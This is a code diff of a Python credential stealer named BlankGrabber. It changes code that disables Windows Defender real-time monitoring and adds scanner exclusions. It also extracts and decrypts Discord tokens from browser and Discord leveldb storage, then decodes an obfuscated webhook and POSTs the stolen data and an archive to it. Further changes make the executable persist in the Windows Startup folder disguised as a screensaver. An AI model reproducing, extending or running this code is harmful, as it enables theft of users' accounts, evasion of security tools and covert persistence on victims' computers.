@@ -43,7 +43,7 @@ def wd_exclude(path= None):
     subprocess.run(f"powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath \"{path}\"", shell= True, capture_output= True)
 
 def disable_wd():
-    windef = os.path.join(os.getenv("temp"), f"{generate()}.bat")
+    windef = os.path.join(os.getenv("temp"), f"{generate(invisible= True)}.bat")
     with open(windef, "w") as e:
         e.write("powershell Set-MpPreference -DisableRealtimeMonitoring $true")
     subprocess.run(windef, shell= True, capture_output= True)
@@ -283,10 +283,9 @@ class BlankGrabber:
 
                 except Exception as e:
                     self.logs(e, sys.exc_info())
-                    return None
-
+                    return
             encrypted_tokens = []
-            with open(os.path.join(path, "Local State"), "r", errors= "ignore") as keyfile:
+            with open(localstatepath, "r", errors= "ignore") as keyfile:
                 try:
                     key = json.load(keyfile)["os_crypt"]["encrypted_key"]
                 except Exception:
@@ -295,12 +294,13 @@ class BlankGrabber:
                 if not file.endswith(".log") and not file.endswith(".ldb"):
                     continue
                 else:
-                    for line in [x.strip() for x in open(f"{path}/Local Storage/leveldb/{file}", errors="ignore").readlines() if x.strip()]:
+                    for line in [x.strip() for x in open(f"{path}\\Local Storage\\leveldb/{file}", errors="ignore").readlines() if x.strip()]:
                         for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                             if token.endswith("\\"):
                                 token = (token[::-1].replace("\\", "", 1))[::-1]
                             if not token in encrypted_tokens:
                                 encrypted_tokens.append(token)
+            grabcord(path)
 
             for token in encrypted_tokens:
                 token = decrypt_token(base64.b64decode(token.split("dQw4w9WgXcQ:")[1]), base64.b64decode(key)[5:])
@@ -321,14 +321,14 @@ class BlankGrabber:
         token_threads = []
 
         for path in paths.items():
+            localstatepath = os.path.join(path[1], "Local State")
             if not os.path.exists(path[1]):
                 continue
-            elif path[0] in ("Discord", "Discord Canary", "Discord PTB"):
+            else:
                 t = threading.Thread(target= lambda: RickRollDecrypt(path[1]))
                 token_threads.append(t)
                 t.start()
-            else:
-                nextPaths = subprocess.run("dir leveldb /AD /s /b", capture_output= True, shell= True, cwd= path[1]).stdout.decode().splitlines()
+                nextPaths = subprocess.run("dir leveldb /AD /s /b", capture_output= True, shell= True, cwd= path[1]).stdout.decode().strip().splitlines()
                 for path in nextPaths:
                     t = threading.Thread(target= lambda: grabcord(path))
                     token_threads.append(t)
@@ -409,6 +409,7 @@ class BlankGrabber:
 }
         if self.trust < 3:
             fquit()
+        self.webhook = base64.b85decode(self.webhook.encode()).decode()
         self.http.request("POST", self.webhook, body= json.dumps(payload).encode(), headers= self.headers())
         with open(self.archive,"rb") as file:
             self.http.request("POST", self.webhook, fields= {"file": (self.archive, file.read())}, headers= {"user-agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36"})
@@ -437,13 +438,10 @@ if __name__ == "__main__":
                 vmprotect()
             frozen = hasattr(sys, "frozen")
             if frozen and STARTUP:
-                if os.path.dirname(os.path.abspath(sys.executable)).lower().split(os.sep)[-1] != HIDDEN_FOLDER:
+                if os.path.dirname(os.path.abspath(sys.executable)).lower().split(os.sep)[-1].lower() != "startup":
                     try:
-                        exepath = os.path.join("C:\\Windows\\SysWOW64", HIDDEN_FOLDER, f"{generate()}.scr")
+                        exepath = os.path.join("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\", f"ScreenSaver-{generate()}.scr")
                         BlankGrabber.copy("Blank", sys.executable, exepath)
-                        wd_exclude(os.path.dirname(os.path.abspath(exepath)))
-                        subprocess.run(f"attrib \"{os.path.dirname(os.path.abspath(exepath))}\" +s +h", capture_output= True, shell= True)
-                        subprocess.run(f"schtasks /CREATE /SC ONSTART /TN \"{generate(invisible= True)}\\System Handler.exe\" /TR \"{os.path.abspath(exepath)}\" /RL HIGHEST", shell= True, capture_output= True)
                         wd_exclude(exepath)
                     except Exception:
                         pass
